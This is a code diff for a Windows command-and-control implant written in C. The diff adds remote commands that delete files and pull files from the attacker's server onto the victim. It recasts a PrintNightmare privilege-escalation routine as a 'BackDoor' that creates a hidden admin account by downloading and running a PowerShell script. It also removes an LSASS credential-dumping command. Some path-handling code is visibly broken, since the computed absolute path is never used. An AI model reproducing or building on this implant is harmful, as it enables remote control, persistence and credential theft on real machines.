@@ -1,5 +1,4 @@
 #include "c2_comms.h"
-#include "c2_proc.h"
 
 
 // Global heap handle
@@ -23,6 +22,72 @@ BOOL change_dir(char *path, int len) {
     }
     // No support for relative paths
     return FALSE;
+}
+
+
+// Attempt to remove the given file
+BOOL rm(char *path) {
+    char abs_path[MAX_PATH + 1] = {0};
+
+    // Convert relative path to absolute path
+    if (path[0] != 'C' || path[1] != ':') {
+        sprintf(abs_path, "%s\\%s", PWD, path);
+    }
+    // Otherwise just use path as-is
+    else {
+        strcpy(abs_path, path);
+    }
+
+    return DeleteFileA(path);
+}
+
+
+// Writes data in file at serverPath to file at clientPath
+DWORD write(char* clientPath, char* serverPath) {
+    HANDLE hFile;
+    char* data;
+    char abs_path[MAX_PATH + 1] = {0};
+
+    // Convert relative path to absolute path
+    if (clientPath[0] != 'C' || clientPath[1] != ':') {
+        sprintf(abs_path, "%s\\%s", PWD, clientPath);
+    }
+    // Otherwise just use path as-is
+    else {
+        strcpy(abs_path, clientPath);
+    }
+
+    hFile = CreateFileA(clientPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        c2_log("[!] Could not get handle to file");
+        return 0;
+    }
+
+    // Allocate space for file data
+    data = Malloc(100 * 1000);
+    if (data == NULL) {
+        CloseHandle(hFile);
+        return 0;
+    }
+
+    // Get data to write. We send the name of the file we want in the format FILE:filename.txt
+    // TODO: 100 Kb max file size rn
+    char request[300];
+    sprintf(request, "FILE:%s", serverPath);
+    c2_send(request, strlen(request));
+    int n = c2_recv(data, 100 * 1000);
+
+    DWORD numWritten = 0;
+    if (! WriteFile(hFile, data, n, &numWritten, NULL)) {
+        CloseHandle(hFile);
+        Free(data);
+        return 0;
+    }
+
+    CloseHandle(hFile);
+    Free(data);
+
+    return numWritten;
 }
 
 
@@ -119,9 +184,10 @@ end:
 }
 
 
+
 // Checks the registry to see if host is vulnerable to printer nightmare.
 // Returns 1 for vulnerable, 0 for not vulnerable, -1 on error
-int CheckForPrivEsc() {
+int CheckForNightmare() {
     int vulnerable = 1;
     DWORD status;
     HKEY hKey = NULL;
@@ -165,6 +231,7 @@ end:
     if (hKey) { RegCloseKey(hKey); }
     return vulnerable;
 }
+
 
 
 // Creates a file in the present working directory and writes the printer nightmare powershell script to it.
@@ -222,10 +289,9 @@ char* DownloadScript() {
 
 
 
-
-// Attempts to gain administrator privileges via the Printer Nightmare CVE.
+// Attempts to add a backdoor admin account using printer nightmare exploit.
 // Works by downloading and executing a powershell script.
-DWORD Escalate() {
+DWORD BackDoor() {
     char* script_path;
     STARTUPINFO startInfo;
     PROCESS_INFORMATION procInfo;
@@ -236,7 +302,7 @@ DWORD Escalate() {
     startInfo.cb = sizeof(startInfo);
 
     // Check registry first
-    int vulnerable  = CheckForPrivEsc();
+    int vulnerable  = CheckForNightmare();
     if (vulnerable == 0) {
         c2_log("Target not vulnerable", 21);
         ret = -1;
@@ -268,14 +334,6 @@ DWORD Escalate() {
     c2_log("[+] Script ran successfully\n");
     CloseHandle(procInfo.hProcess);
     CloseHandle(procInfo.hThread);
-
-    // Attempt to impersonate
-    ret = Impersonate();
-    if (ret != 0) {
-        c2_log("[!] Could not impersonate", 25);
-        ret = -1;
-        goto end;
-    }
 
 end:
     if (script_path) {
@@ -334,6 +392,37 @@ int main() {
             c2_send(PWD, strlen(PWD));
         }
 
+        else if (strncmp(buffer, "rm ", 3) == 0) {
+            if(rm(buffer + 3)) {
+                c2_send("Success", 7);
+            }
+            else {
+                c2_send("Failed", 6);
+            }
+        }
+
+        else if (strncmp(buffer, "write ", 6) == 0) {
+
+            // Find index of arguments in buffer
+            int idx1 = 6;
+            int idx2;
+            for(idx2 = 6; idx2 < n; idx2++) {
+                if (buffer[idx2] == ' ') {
+                    buffer[idx2] = '\x00'; // put \x00 in middle of string to terminate first arg
+                    idx2++;
+                    break;
+                }
+            }
+
+            int num = write(buffer + idx1, buffer + idx2);
+            if (num == 0) {
+                c2_send("[!] write failed", 16);
+            }
+            else {
+                c2_send("[+] write success", 17);
+            }
+        }
+
         else if(strncmp(buffer, "cd ", 3) == 0 && n >= 4) {
             if (change_dir(buffer + 3, n - 3)) { // buffer + 3 is start of arg passed to cd
                 c2_send(PWD, strlen(PWD));
@@ -369,28 +458,17 @@ int main() {
         }
 
         else if (strncmp(buffer, "check", 5) == 0) {
-            status = CheckForPrivEsc();
+            status = CheckForNightmare();
             if (status == 1) { c2_send("[+] Host vulnerable", 19); }
             else if (status == 0) { c2_send("[!] Host not vulnerable", 23); }
             else { c2_send("[!] Error in check", 18); }
         }
 
-        else if (strncmp(buffer, "escalate", 8) == 0) {
-            status = Escalate();
+        else if (strncmp(buffer, "backdoor", 8) == 0) {
+            status = BackDoor();
             if (status == 0) { c2_send("[+] Escalate sucess", 19); }
             else { c2_send("[!] Error in privesc", 20); }
         }
-
-
-        else if (strncmp(buffer, "test2", 5) == 0) {
-            if (DumpLSASS(buffer + 6))
-                c2_log("dump succeeded\n");
-            else
-                c2_log("dump failed");
-            
-            c2_send("testing2", 8);
-        }
-
 
         else {
             c2_send("[!] Invalid command", 19);
